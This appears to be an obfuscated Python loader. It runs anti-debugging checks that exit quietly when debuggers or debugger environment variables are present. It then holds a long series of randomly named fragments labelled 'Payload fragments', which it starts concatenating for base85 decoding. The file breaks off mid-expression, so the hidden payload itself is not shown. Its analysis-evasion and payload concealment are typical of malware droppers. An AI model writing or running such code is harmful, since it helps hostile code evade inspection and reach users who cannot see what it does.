#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cjn2H9b5Dx0jlO = 'f_Fri=t~;>$(y|Qo-?o^eU=9$vbf68wrtd(e>fP}KJ&_%4sXWfo3LJ%prvdjieHj0FjX'
_cgkU8F4Mec5b7m = '-#tv7&>Js5H!O}fR-CRc>!l4oQT(H0{2+N`~0*0mf)oH{z`c94gDrwzt-A~>f~g|RG!U'
_csg4DKViCtDRWV = 'uPczVO;P^oz-Ngp6&Q$1dn-05RmH3n5NSEiGCYY>enr0WF*+Le~nxi>}o?YM$%~=Zb0c'
_cgf_ft9SeecUjt = 'R2#_FS`%T4kzBKYstx;g^$9Z5s6HZjgvS6B9_V9&{vg2%jp5R-ewgLA!N{rR}v%a$W#J'
_cjAWwhFBIYeJFi = 'b72tW})zz&ZV|PQ=|WP3~g^eqswZ&U+zR>_2+1Tm_25&|<CM#p}GI<xbL<D|c)ahdh;h'
_ckU3tFoDuBeOPI = 'J%`f?Cxm9lp4}b($450Zw0DWOtX0k3UfIza(v41GAe{B(u6uihAo=*lWgvGDJo!e!nn7'
_cxY7wC1P3F9xh0 = '%>*7y%c!N*$#cSZ{oE5FK57PFrt$ky_;V8kf|?Z7FNOV6<49B~%u$x8Zm<tO<(h56bJ8'
_cliWOf2mR1eHPL = '-x_bRm=$3(OI0N7W=D*w^~?9OX8x&HxC_{lTjOP(Zkmaf=zm-)Wlew@jKl*VmJQR<Tua'
_cxe3P3kjI1IZ3Q = 'mP(5=v><QT(bBJCKuP_y}kVv0>kc^xm%!AM^Gew0@7?==mFZh1T0OF6V&4PL2Q!+vAE>'
_cigaYhpy6fWgCU = 'xeM_T`lg$cCA`nJH{LD4&|e`r>k86Rc|Cj3<0|{coqxrt3PS?JI=_Kt*dSP8{0Pa!C2F'
_cha397X9XPYxHT = 'mr<m+T#4>ZVPnWMWWZMjG7-yZmF5nm+Sw-S5)|}Uj$ZGfYpTYH;hW!j%7l9ZMR`A^$WL'
_cr8stSHjIMEpWe = 'loK~62S;9q$9&oo0(?bSs=!!MryLKC?%#6Ac3w8kLKkg}-U@0OH8lKEzgz>pqZr^P9K9'
_ci1smlyIsjc0LZ = 'pIzGlu^(<MKupWyXbBX4?b{afB!7nDpTa=ZHWX%xA))t7keL}z!2WlCd%cCg7vI}k$M$'
_cfLMrhhXGEiGDc = 'x(Vkj5$Mwe6mc^tyYxJT__^dO@hU-G!gOCVL0O2e0WMVeSOK3NM7WV##z|`|o@nodpyF'
_ccmLc1Qylla6UF = 'b_q*Sa?wwHhfACK08ulfUn<6iY?^;DOj70nl(Tn&4u1eckqo_!;z(JPJUFb#rE>UQtKU'
_cpwRpn_PTc5YDU = 'A^ia%PgSPPGU4Z_Pr~Ct+N-X~d^9OF-e$-xv+q)HlN(`c0fx-hpBWPTGv31ot<r+S%;$'
_czM7WY120fK3j0 = 'uaivZrXi~OvfVfNA0?o^X!PeOo|#6H~6m#?ch1Vr1AdZA#@vPQ!+Y?@G4hchBsCYdP=G'
_czTGqDzAE4Ia7X = 'a+>qR`|@R|MgPyi1CV-h~O%UkfTOkcuwU-d)Unx+0jCGLx{t$R@djtU-Uzky|2iPJf)h'
_cbBHTX8zRD6VtY = '%fcBoQ9J3KWRuEkrgD$G=x^*0YX6XeZS7(=%m-I=U<Yo|=gdEkT_2l)Ghn8cRN%fNKff'
_cjbQCJWwr6ZMeM = 'rIHmS6h3*d92_a0B-gI+Nd?r|%0zV{C`h*lR>^V=(uQM6{iF#)39_@c}e+Znrv~M`0QZ'
_cm4y_PdkAxYRMH = '@5iAlO0!3rH{V-tuGAMqqC;fT7E#6YB&)l3<(M7|()r?Pa0}T8pH0sP!K-LE?@i9PQr('
_cdT7aLfgO9hxAu = 'E{tc@^=F0=JwbFPz$)V?#V;KV2XiM%*Nyseh&J(opmY`KTmj#ZH>%vrSu;4|3HGXn3|U'
_cryA_rD9n4_K7J = '}jxHj7Yd}#84Kf=2yVUp5fyARtv3D|BP_#zNQH`@{vWtu8ySL;f`x^#haXgDP~ld<WW-'
_cm0_oS8_q1mUqH = 'ruEdoeI|YVY_Sg?!3g^7EUGlVzETZ4XBi>tWi$H1)hiUa00aznOG#%;&IfA(b%*96L?s'
_cey94dasaS0_tv = '5^07Sj=|hDg21dcD_7&yH2Un5d8yIj&j;Mqe+tp*P*I_-Wdg;nscx_)Y|7-9AS_0Ait7'
_cyQtQqR61Wq3BP = 'lBXzT<x_xTheAR}aWb74Qw(xd1a<Jmh@cS-b8wlTL>)w1g##e}`b;CZ6{GM86BdJf4AI'
_cjYONYQxcZC9N4 = 'SCQx9#e%&Tl-lfBOooK5W(A%zE1Ve!%JNf^BdM!Q9b_gFE33J<l~V-XWa)mw5^Qt>g6M'
_crOZw3Z_Faha5f = 'SaS6*zOBQZgn1WbEVj6w5ki~ifZKCH6P1?O|EV6h<RZJKHA$R<6Ufo`Yf}f15A>A6(TW'
_c_e03D3TFTpA8t = 'R)6?174S8GfWRpWoW!3CRF2>C16;%V8W!BccGNA7*L`_&i(Wh&HUkyv*(JoTWV=_-B#S'
_cqFhOFYq9ls2K4 = '6$>iZ_zUAy}vW-M7CZ0M5w+!{etpv9m=p-1J}N%KU3boR9^3@s5ZgdA8QQDv&jKL)&&?'
_cabHsn3GUD2cQ6 = 'hklks4WqxA#Bf^NFN{HD>a4PeSm+G<2*jU#9j3R3HJTSyvCb0kxC!O~>yRW2Wu0XfOVV'
_ccVy5rBZSmJX5e = '8if`5>VZx;BZ;PI<Tg&-UUAGq-hC5Yr7x#kaeu|YXQ3YV|RByILmp#3JBPE%`e#DsKjy'
_cdt2GhRx1kb2Q4 = 'UatJMtak4m$(7<%QB!pA8c~LU4(}w@X@ZSVWI1tQ_vQ9;kSG?0A;lvk+JsdIU|=nj#<y'
_cnAnLI67jyo7de = '2+@e-v^H&;M-22_s9L`_P!XZ)Y0O1`a4)_U4b(;mSf#SOdS_X)J1YBY>ph{z?84-)P^N'
_ckXiy7HAlN0EC0 = 'sJvo-Zs^fxQjFM-)#Gs!Pxr7v$K-ud}kC0jI}eXB42soPhCgoqq=pxcGT)-55SNF>CEO'
_cxsOAQe0doGdQY = 'gj&5)sSmCrDuHa{L7xu*e8z_Xg*1bp1Ml4jFeX~Y&}y?wXwRE0I9$u^mA;$qL%6`yGCQ'
_cunGCsF5fPPdfl = 'o*BMo4BGfkTbGiF-<ldYRX8R3}r2)4lAPvdi&nE>jo714ZNYz5#3V)pd6T&c}?VgJNtf'
_crQignmiwsf459 = 'ildvh85R~9i3S)oDiFOsl_nl;3)_wlkmE8)tdj*D@KT{Yho9s$$GLYv<UXo-1sG;*<ns'
_ctiDagWLIn22bb = '<{XfJErI9Q*ZTKEQ`c<IIA0-;Qg1{SG5fx&HJ_My8k8Xbk$5y$hBw2bW)J+*V5>&%XJt'
_cfl7jt6BOQO6Xe = 'kSsP-y9x1^N~o`mH}gqu$8$E~{K@$l5sP(xN`;1DUVb0AL*zR?hD;>W7E9HjjoFQVW?f'
_ch8vH2DFD_AYhH = 'mh6+zyDIK7Kc8HFWhcaUQ*J`Nm0L<R<tY{g4$m!b?E)9Mhi`cRk_r?b8`sZA86uQY=H3'
_cnNHqEj6PII6Pw = '&zZ{k%x|M1PHc1d#ll213){1#xQbJQA|)^zxEX?*aD-2DZ-cyh!uq$=<5=By@M)Z2w%S'
_csKkM0JBVzBRr8 = '#ns8_t86B5OK{1U&y>f8|~qsX<&Kfl!>jGt2ngvNx=Y>;DDjX7c<StmYux>^V{2<=%MB'
_cuXHdwL3_bJYbe = '4ZK%$9e<WR!lpRaMyKjAo4`Y^|yZeK#3Jv-;<HJHVmo^Kq*HI)5h<pBB&9Z{Kx;$P){H'
_cezFm8b5ZNbyYC = '+_k>&`2n3jka+dWA+LLig%Z1<l9wtgd8sFt0oW4FAVae_Wn`lJFt6IUs*nQ=jx|yZH<P'
_cj2UB6yt5tDyVd = 'S9WKuzu$t`(Lx}3oq&LiUjw+t<%6#?3y(=!2jx5(7emJ(CP)*$q~&P6E3B!++#nw+6CA'
_cfRkE4_CaNc5Ro = 'om#{5w^J~BAlMM?=NEJ18I>=R2sCk;1lW#S&F)1kT-o>*_Ja$++WolWjW<8GGwB1te)@'
_cpDmj6meucnjKN = 'V&_^h(+q~0I5?d`+`P&9<@jXkHiE|e2rJI;DMPRic22#EbyLh+g8SWp&TqFCP5Ix!7`}'
_cly0CmLvrse3MH = 't3i?1kA{#uNJR`jnmaGS6zilJ}ms$zWZdPht{Ckvi8k*dWr7uZ<T2Rs6-iCl}Ze)WS+|'
_cgHVjucrTKt9My = 'T%imvh2iRqb($YHEUKuI4_0JtAq2_nc~Me@{QyUHN8e*QOkCRel032D*v;iUi5%!4}XG'
_csMCcmuhp5EO9H = '#u}$8cV1)(uz0l_zZrnUTjxZ&w$l)W<{xl2+H6>t*4I9Iwuz@i1{%d2zkN>1$Pq<BKM?'
_cvm4x84LmUZu_Y = 'BnSnCd!uC6cp^iAvagg8X;IIl1KK1lt<`wO7E4HBSGu9~7~@dM1oGY61t!lpyBFKnaVb'
_cdArpGjVd5abYh = 'wvYru{4LRz58Qd7B<Lx^Y9Ohi}kOM)<e4n@5E8gkJp{>Z07pp@ceUC{1r99Y4_N>(LlK'
_cujxzx0lrHwjwY = '&&jf%Nl}1$T+U?`?3UW<z3(edufG1SEanaeg6#k*9`nCO}iEA37fJRe(ww$|oY<vh|${'
_ccra6FDTL0hDoF = 'oc>y}mV_*P6qxNeB+1$sPVB(<fP3toAF{<3U%%03u3im?B-G9cT=0F2V!hF-S9SP<PGO'
_ca7hfTguivEwPQ = ')_f~Qz1SiKL=v$|4I?6C<)oI6Lx@ys)@*0z&~@rlLvmb<i?qsep-_oQ2J<;vw*gQ23pa'
_cjTtlRJHJPoHkC = 'G$5AEF+W93zFo*}*MK_<wd`hQ-Y6EKO#D`TKl>Q=+wZA()PmJr#(vb6g;vv*K<$$Ghnu'
_cyTwwSkGB27_fF = 't!{91RYDqpOnc_U=!tFiYbncQB46%X=6D_eK%+DE6)s~R^k<Gmbq7L_>t6s=kwV$1sS6'
_cosCkwSpJPFEKR = 'BzF54$ow=W%q_)&kJoJnavr9HhxYF5`iX19AGanGpUnHt&mNjtit>?ovE$AVF%WZbndR'
_clAi0K5v5793OD = 'J%C(&XH=UV6Jb1D<bpX+7q{K~Yi)0y8EY((tw!Xvwa{4uvtT+2_cIa~>cI_Z=Q=P?znH'
_cfhoYb6hJTA7Z_ = '1^sN$X|B^M&~<iq?4y*{w76>$#P~xe1`lVe!^z``1gN5s3XPvsc2O1bNLeyV6fKwrmOD'
_cpYRROfEJtk3VH = 'mJ6Jq%J7oZ7a@RDewZGPo51>(2aq7%7~Om#;5S!EN;7Mw74Rp?iaAYf%!YedOsu>VuPP'
_co0D0HmdJX3gfS = 'DS<+EK!wEDy#EuStuKy*t2y;K-fNCu-&+wQ$VIC`yDj)$~X4%<P|LZf}|;Sl9w#;FcnW'
_cfuhRTLR4k35MJ = 'yw@jM`*^(p!sThq2cp_{kn%DpvB!jz-J-RN5hzT5J*haBKHBSc&iyZ`PIfQ!nm3Ee?JE'
_clARF5GkEBvIId = '|cps#C(P@)N>#dCP8sI?ZCae)JgUBDjL~IUv(9->ruqqaiV0%GKgL9ap+-r4uxQ#HzO$'
_ccL6kga90w1d2J = 'Q_=u<4IJ3`s6IDrVo_GUC|ojkcyjr~B$TvO9uwaD`oA>%0nwlY`&vPsOJF>Di+zwx!8D'
_cliOSv4Y0tg845 = '-~Jzt6L$@mki3a0Rs>=@FGbEWsX`)+!mzjxUm7L<U)4zIbxSPhj{<C@e7Rrj9NIY#K+*'
_ctU_zqPDylbsUJ = 'JkwexB1Z1h@w8nvQMfMAVJb|Rj_ZJ??pX_5Qg8@9}}wuELNs%OKKhOvlA?AE2>D`y=}n'
_czDjwaSyPmn3BZ = '2kVuBopBmzoYyA>aMf6(u^zh5+;9~5asDc+%`Uy{G74TvO_X~7I9W|yLinRy7D8OoMM|'
_cmuCsp6ITnymT6 = 'Ae1-ESSyN}M7k7JM-#5woX?fwChPG9lUyNSD`C*d+VS$zEus&50gMKC%OFa6qEo#l<_8'
_cupBzsAfdSnw8O = 'e}c%=f)(K@ZCdctZ`A(b+;ojl&}_8y1bQ+xGP&X!{XBl#0!|hCT^S9hKvC<EYY^S05(i'
_cdEKzsiKPwe0OS = '*}F_^Mp5)Z>ygP!Ls+_<EjAB+S=@1To9NPktvD9Q!CdLFWm4bFX#)M-IUE%}9T2S^whO'
_cdh3JWFbLufbux = 'ncZ*CTJKQIA15-A!)O!X9ASa<NkY$+-3+Z30~tbL0n`aP{9=NehAe-9nfMSb;%4HA{Dl'
_ccRklXZdBOsXW2 = '{C0v@v`-4946a!5++g=+$qCGPLlEx7T#<$+P&F|O15do!)H5SicHP(%18!K2#4BH8`RY'
_cfyWOAKejUHlEk = 'k7wc4uj_Y&%OV;*ub^gxp2ET5i80Phtd=gP2U@Uv|=b9e1fG#LBE=jt#(h(>*xXz_v8L'
_ca9AHutCa4IfxR = '0*-za^P~IhXs3?@>od%-{%R)b4+d%}cgKz^XVa&^B6e)6(+2#I^}34jqYFhy_@vk1O=#'
_chJCC1EdauhBkf = 'Lc1+o=0Rbj1wPAU;ps~8vdkApV*$8{eg4apbMZjZPBx_t>jziO^U_E=zddwu!4XOa|L0'
_cr3C2aqa0eeMs7 = 'M=p<5A^gL!H~!N`EUZiZ<N$R{n{oy!_yYT!j#I+%%vjm39d`DpepP6hI=xZkL}*J6^Cb'
_cwesiyRmnnre2k = 'L5zI(%jwe9%x+4hyD=NUkb?F8dT2Zkb#32bWQ)L-72}vE?h168>){}^f^xZ;`3*U`dll'
_cdKYN9j3NpfJg5 = 'p=t#sH@Z6G!%eIO4n3{}+8uot$xRbmDVXdD*n?;d|K|*H-$d;{AV-)Gg5o<RBk!3w{LV'
_czexrAAKN3OS7u = 'dow%gmF#Sk_O1Uff;^D&U&0PBcngp2ZqVCEm7wDUJ(7!=ZOQDZEB-u?sz8U?gO7!<!^$'
_clmBcc3sDn1TkY = '}K78l!Rri}X-l^OuBdM4yc0kD4kS!%xi5E@-Yeq9>%D1f}TV5jNrS|?~RoO?bUT(Jzer'
_cv6rpsjtPFeAXG = '<VRPrdXi<lPqhM98lKw$!UEmz>z#>Ge6)ziChM$8&h5hJKkH^SA~z1V3|%`#N2+f4?;)'
_cb8ZZ4a7kKK_PE = 'afW4oyK3dv?<AZS0Ip~7@()^egi5-xHo?|QzXflV~g-5cU2zoiTXH~$6RlDNI&YYhL0='
_cmMniyCfoUxtUz = '+#{%$_)PQfc(lMnWhxc{kP-L|Cg!#k%spF`!t)me3mM&a$QCloSeE*O|13l`NR-aKTAY'
_cy5bQOqmULPdYQ = 'RzOkVg0d|p=Oi&V3l9D99*eA3owKJ63qRF}a%E<Fkdu@f!T;UBxjF|l0n6_oGLl-i0JP'
_cyEAEwukjhiFRR = '8190A|27sEs3Z58d1LUSzSu(vo6fQiLmO>b_becPNJsG;lgEy7xx5J7Nej<~%SWHDQmV'
_cz2cH3nWvvjHN_ = '9kg{0>9wjO1iFu8YV=f)|aoFNu%1pdn_f&@`r+pH0XyG<eD`8zO)E`HA1zOeI75nG(y?'
_coesnfG9F7DkNN = 'ugoxE1R~8D5QavBWG~s>Uf`K%sgHRt}J|e?$8aOHc7nzuenM<dkVhGQzT?)-wGr+RRKY'
_cna18inIvexFCI = 'f4mokw7N7BD!#U3<P(jFb|+N`A63x?vyQSBsd^bQ6UpoG)d{oi7^7tjt9P>4BJVH&L`}'
_cdMnnwYj47XnrV = 'BNgI-(T{b$@3=IZj<*|uqn^aE!2C))gcw}lq_t|=6&yd2SOf3g+R_`a@KI+@U^HP9m1n'
_craNiW_3YPw7Ii = 'g&L*%o&_n^T|7_k&2$zQ7|6{B{{^@WtWPB#}%cPjxn0sr=WTyMirg*R&B8d9<VKvXFHN'
_cgrsNzuWo0iyWt = '<F_$l6VJJHhbf{@`Z#$%i&YVcFKs)lvBAE_Z%aO__NR$&f!~C4mYwC)eOYmxb05TK5|A'
_ciozPa46NMPF67 = 'kPu{1|U`Z<$(L%V>JW2tCrv!Cev><O58Bm62E%0&Y7S1Fcc;96Km4zU5ALv?nk0a`#mH'
_cu0B1RCBA6mmB3 = '!s7FZh!Gau`|yv@K*aD6+?zvUq|B`|fXFQ5($YfV)KntO%reVIN2aA0P@g5(>+6*F8I^'
_cnWyEcLu8xFWyX = '&TTP|i#OIVXHGZ@FVQHmBjL{Aa-Z$0g4>&X#u@&*u+n}zUsq(sxQ03mGrGj=@TTK5vVj'
_c_Rx9qlm5wHTQR = '5o7AQ^1)JP7}JMuJT+~O1H^P8{ez#lr9j`n-(+El)mc$yd4oorXJ`}YDk6t}t0^|c@Yz'
_cq7Vy5xxJ4vt9i = 'tPBCLIOzvqq2EcG^N4<*f=d>Il@dDj><+fEhhDs+eTcl7q}Ex^v5=8Ullk-{fi5>1jK2'
_cpwZEf9WOXAVLw = 'w#fu5cPVE94ROF}^5_TjYG|4F#<BSc&1tziAhq+(%+<GXdYGRlU8`hz430|w?i=Yvb-0'
_cfJhhCrvvetw2E = 'u<PdthCE={^zmz}>T=Ft5~>?9Ht{L~XM#ZA3z*WoOlRLRq^?&c~1^-FHh4mFN4_r(PPA'
_camgHeX3E4DFgR = 'o>x%4Wbi&CF<A`I0&6SwRPA-!4KEIenwP(@b)BWXhuhWzJJZFxZ7JU-iCp|nMBFYV*R*'
_cwDMY5bv_tj7Ue = '1QA2S~na!xp2M}O(+a6(I0t1Vr7WH{5ds82_Kph0?zW9IM6&^fI%0?Apa`VB?Nl!9#{T'
_c_bipCwPRYaqXF = '@7Fa$=OZKS}Y%gMUfe)86a3~we}Usm&Y>%u3v>!KZ1&rnqERXP6JFmFm^6HAp5tr{?GO'
_cd5ucxTC_Ioa8v = '{^-4I8MIlUN0j{C`y;`tRWs#fK6-{NoM!O1zQGRRTlWb3$`k9Z;d6;yZbhQayEG=70lz'
_cmn8DQ1KiMwpqp = '<Eq5D@EKR(i0ND!Hetm@ka}3FA?XxdB`o6t}>1no=|&DLXb}-_|yIpU)X|3cOYO@TMay'
_cvm12pdgeHoYxR = 'M*Mh}f;r*pEP^m5UNG<t+$w>3i!5<EOefljO>ROOd(HR^xdA+ONma3)JgU%%hXUzR<TZ'
_cqJ48lb2ztYg_g = '*h7&mC52lO#D+w}JNa>x2uaDlD^4`x7iy40(^8yvEBE<CRT@p)yYSBkI=`TD|SzvMHE;'
_cfMK5HhyYXYheP = 'E1#|y36Om#kiD!f9c4DT0q`@cf@1bzTu3T<RU8Rxi}uM#o>Lc<d`p8zG>v-<_^MOe5gm'
_cuXpZFiMH1sLLA = 'W@l?j4=~M9w>Wmfxpb$OjD{$@tGl~pQCArQ$jCZW}!xH8w-@|OJQO5D&b4c_v{0A&u&2'
_cehMC7QpNJAa9W = 'a>-w!z7f{4UWYX)jkY`CHx=bV6f*onYYQR+}o4Aj9&O!N^Rm9hZclgl!_x&<s&u_G6eD'
_cljy1muRwVaqZV = 'G!>hAN1;)=`>afbCROfZ3SKgj3kIc~2F0d)(=QW@#GoBA*fMq4dE7OM0sEHUkp_xCx>g'
_cdOsh4ok6Z7OYW = '!&yn5OKkki`FFDUl~*fP84;6ctGuhYu62u7QtVS6xB8iOV-L0m`d4<}Jb2I9xJ?CG?AN'
_cfD7cl1AVkHhTy = '35QHQ$v-?QvZ8Lej4t)j_PcFRDwDd&nY_X*4aj#n>TY<?TpjsCU7}@$NFa+jGr?Cs)r#'
_cvmQvP1m1j3Vwx = 'guIz2wV5v}7Hq+KlHS^^Ya*iF7cn-=z7gl*KDHYwyX>*x;)P2kLyDm>ll7PN}2YCjo7E'
_cfaremo4_yefY7 = 'V~a4gSkkm?OS}#LBIDW31VEe{ceE%!=b~Y>73#guc76DjqPWaS^0q5<RJ>6X(67`pF^`'
_coR4upeUY5o9H6 = '5e6IC=<RH%sFKvM!U-@nT=#qc9|&!NI~waxI%b>-nYJ_E$?-9bt*t$o5E7T*{~L7w8Y1'
_cv1hnQ4Z06BMnL = 'rOTUZ%)8^9-j#5NV1aR#H~M*dsSv(O5&)Gz|RL5@Y<*32M)BMmd;`qM`Q<*$5MF<eh;o'
_cnxzOB7KRGwohc = '#lsphAO27V6&0j)G9i!wIrU?>PDg)jv@6+N_`5`=cxRI^Q@IzJ%LJ0qty=S)||}J3~MC'
_cecVKnCgyWtGjj = '=*Wa&Ok2QLZ%eBTz!x>H2a4Thv+b_I#oirg#%pjnDovi@yI@U|2GEwpL1Sp$nx!6~qH7'
_cjOH9gtyqsz7JE = 'c+9`{9lzn~bbFX_?~8yT|_Vd!u*^U`keoTt9bxkH0jwQas%f9^OH{fFAP^A9Zi;5WR=o'
_ckqCoeBSx4yX5r = 'Bf3H$AR+^R57ArrRxKH}dJH||KI8x+NCyYsYh=ngJg+iGswe0wl>LKGQY>Xl3UR=8RpD'
_ctbvj58LVwDbun = 'u|{M;;iCTZ-<qpr{;Fq~1U@R}oxyC(;0EZjnM`uBh9#vQE)&(5N`A%Sq$NdGYn>!QIRZ'
_cd_358MBXgxlEK = 'oQ8opX#-8Ae<_4`bnz9x@y0?2LorR9hv{F-8IrgT*B1!pnoP&_@o2vRdPbunc7LSL|50'
_chm9IspAupDOzH = '5v&X&t6}nQx)NK9*-_e?{8M%N6>}~W>A(c9>QBtbL<HUoq)P6-XjRt8;=uusOeCO4@w*'
_czU2S261Ojjgzz = 'i}>IOBL1aDOD2L!tq!>5b-xnbC&R<PN6-BQxDVW7nB1-=#v=k;AbvWh6f!;?}$~DJioS'
_cfQD57H7nz79Fc = 'WxI-O?PyuL2&96ITy2E9(n}rnACUIw*LszmVm})hiXEARWS>q}7kusI$y>EVVSa3fV<;'
_cz8p9hVqgjFNIK = '_{qj<+4<IY;>%d0tg5?=~<4&McC*O9~fvCo0#0pgr5-Fmx$c@HOJ9t^kF2H}GdX&KA1('
_cqnf19BsASgr_q = '+nWZ?<}rboeCa1Z3R}1sWO9k^UyxAjPoPZ><3=3W1sXC33lksl`W_HJHm3=4!y_T5cw+'
_ctebPvCcFds2xu = '8HK%JA&T`-men>eMtp}JoYq|O$*~{9+pIcJ_lJ_2H4&SjTM=n=fyMhh&>FeELl`?<(HN'
_cnMTu_SqYHat5I = '2<XO5c4K1e6Zg&~?ZFUo;<mCZR3ElJB##<d8t&s_?e@q|?Cl;?aP0&qq*r{`N;yPZ2oD'
_cjuEFKhUh3WcGS = 'fxpH=PrXtaXSWdKARU^lc5z3p-h<E>+v012zbP4TWBp<3aq_QT|5lOXeZ*IWNlRnAcu<'
_cp8TZj86mrdRY8 = 'f;B_@Nk4r{ZKuVu&m?mi<#_#~D8Dc``aNLd+wsy#o!(V|VzbINPssE=OO<on?-GgYt-+'
_cboFtNHQHYQrUd = 'g)}MH7D{?fM_*wdsH)rO>y#ik+Q86>u|NF;3@?GWu5JliI;MZM-Hadw@YU}iMCz-ohm_'
_cpAzL6adboW37S = '0Y`{s`dF$*(I@nCWvTCs~(2M?Szd{jIZ%;=7ou=ft^<C-Wi(eqTNAFs4XhJoB{G^>K=o'
_chu5FcL26BhI6V = '3qatvQ~go$px8*`Wj>Gv=RTe=pqb&q*K#5v(~R;bG}MVi5E?6cqp1!Gg2to9Zez?hl1H'
_ciNHibohy1x46Q = 'Ty>T*z0ad_g_NM*m8V0fVPnOKykQ$Hic67to1wkr<WDKC*nO-&vuT2Rq@R3eD#a~p_Ni'
_c_lVHqMjiWnp5s = 'f2fHn&T#kGdqDr!tt+|Kvy8NB5y$jAhnQp*BKOE0LR-gCWSydZ%g5%oSBU~Et7jl!4e%'
_cjwryaOvBBQ6a2 = 'eYEkSO-lX2}X|GFH&7Ob9tMo0SZ@W5~6y6Fqm2$V$;h3P;gX1bEgBlU{{NYKcz^B1{-#'
_cgcG5XKuTJw7fx = 'E@EFNmgwuSPV;q7u&8Nz1d>}h&TN291l@ZLiPt3Oarb_^)EiK`TUQ(e?lB;uCkWr2{Uv'
_ctXBuojE_E78Nf = '1{$XR<V9`DU=qyn^aoI+npysT_P8CDM18jb=-vY9#>f0}Rq_YJYIW!Ula`;}|%&Iwr?I'
_cbSL48w6VEX8qU = 'qgPdHvfIAp;>}it&nnNzfT+CFA8p%ph*_mzmk^oow^9>SR75VZ(5$}*G!q}wvtG$;e9V'
_ciKosFxMXy24dN = 'eLBY^_`P{|(S`4Mgw^u;HbyC=yQE-wF;<V6eNkl*vQftx<v<E*z1x<0o}xkUptv;O4%?'
_cv6qJommYcZU_Z = 'l-uWQoEIEYar!fdsU2Q)PxUo_?Tv(h$yb9Jq@0{7>1X+3XnmIi(<^i(KwqX_~yR>EBnX'
_ck2Yzwmp9w6ayD = 'jg03hQG{R1zNeoFcpZdX&i23T+u&a5hjYS<d^xY4W(o*#2@3s$~R%C0w3gAB@t*#3YLJ'
_cqP16R6tiKc3wk = 'g!j2FyYtU5`PH9H022Fa2u4R=&XBz1yUJ`cs%bR42MLz@YZCa!W~E1OBoLOH1v@j}$-o'
_cfeyAbdMlW_vkG = 'N#UzXSxO^pz0+SlPxwoCJdr;fcFnFVSuiu5y7w=Q#|s%KQY4I=CY>O{Tt})RZPIUV9_~'
_csjkH3UCXwiqF3 = 'pou_3yf^)ko<l#=;(hx{Lp0g0;A?aZeHU+4nXX&5w(lExx@o|X'

_pbg_A8xOQXQwia = __import__('base64').b85decode(_cjn2H9b5Dx0jlO + _cgkU8F4Mec5b7m + _csg4DKViCtDRWV + _cgf_ft9SeecUjt + _cjAWwhFBIYeJFi + _ckU3tFoDuBeOPI + _cxY7wC1P3F9xh0 + _cliWOf2mR1eHPL + _cxe3P3kjI1IZ3Q + _cigaYhpy6fWgCU + _cha397X9XPYxHT + _cr8stSHjIMEpWe + _ci1smlyIsjc0LZ + _cfLMrhhXGEiGDc + _ccmLc1Qylla6UF + _cpwRpn_PTc5YDU + _czM7WY120fK3j0 + _czTGqDzAE4Ia7X + _cbBHTX8zRD6VtY + _cjbQCJWwr6ZMeM + _cm4y_PdkAxYRMH + _cdT7aLfgO9hxAu + _cryA_rD9n4_K7J + _cm0_oS8_q1mUqH + _cey94dasaS0_tv + _cyQtQqR61Wq3BP + _cjYONYQxcZC9N4 + _crOZw3Z_Faha5f + _c_e03D3TFTpA8t + _cqFhOFYq9ls2K4 + _cabHsn3GUD2cQ6 + _ccVy5rBZSmJX5e + _cdt2GhRx1kb2Q4 + _cnAnLI67jyo7de + _ckXiy7HAlN0EC0 + _cxsOAQe0doGdQY + _cunGCsF5fPPdfl + _crQignmiwsf459 + _ctiDagWLIn22bb + _cfl7jt6BOQO6Xe + _ch8vH2DFD_AYhH + _cnNHqEj6PII6Pw + _csKkM0JBVzBRr8 + _cuXHdwL3_bJYbe + _cezFm8b5ZNbyYC + _cj2UB6yt5tDyVd + _cfRkE4_CaNc5Ro + _cpDmj6meucnjKN + _cly0CmLvrse3MH + _cgHVjucrTKt9My + _csMCcmuhp5EO9H + _cvm4x84LmUZu_Y + _cdArpGjVd5abYh + _cujxzx0lrHwjwY + _ccra6FDTL0hDoF + _ca7hfTguivEwPQ + _cjTtlRJHJPoHkC + _cyTwwSkGB27_fF + _cosCkwSpJPFEKR + _clAi0K5v5793OD + _cfhoYb6hJTA7Z_ + _cpYRROfEJtk3VH + _co0D0HmdJX3gfS + _cfuhRTLR4k35MJ + _clARF5GkEBvIId + _ccL6kga90w1d2J + _cliOSv4Y0tg845 + _ctU_zqPDylbsUJ + _czDjwaSyPmn3BZ + _cmuCsp6ITnymT6 + _cupBzsAfdSnw8O + _cdEKzsiKPwe0OS + _cdh3JWFbLufbux + _ccRklXZdBOsXW2 + _cfyWOAKejUHlEk + _ca9AHutCa4IfxR + _chJCC1EdauhBkf + _cr3C2aqa0eeMs7 + _cwesiyRmnnre2k + _cdKYN9j3NpfJg5 + _czexrAAKN3OS7u + _clmBcc3sDn1TkY + _cv6rpsjtPFeAXG + _cb8ZZ4a7kKK_PE + _cmMniyCfoUxtUz + _cy5bQOqmULPdYQ + _cyEAEwukjhiFRR + _cz2cH3nWvvjHN_ + _coesnfG9F7DkNN + _cna18inIvexFCI + _cdMnnwYj47XnrV + _craNiW_3YPw7Ii + _cgrsNzuWo0iyWt + _ciozPa46NMPF67 + _cu0B1RCBA6mmB3 + _cnWyEcLu8xFWyX + _c_Rx9qlm5wHTQR + _cq7Vy5xxJ4vt9i + _cpwZEf9WOXAVLw + _cfJhhCrvvetw2E + _camgHeX3E4DFgR + _cwDMY5bv_tj7Ue + _c_bipCwPRYaqXF + _cd5ucxTC_Ioa8v + 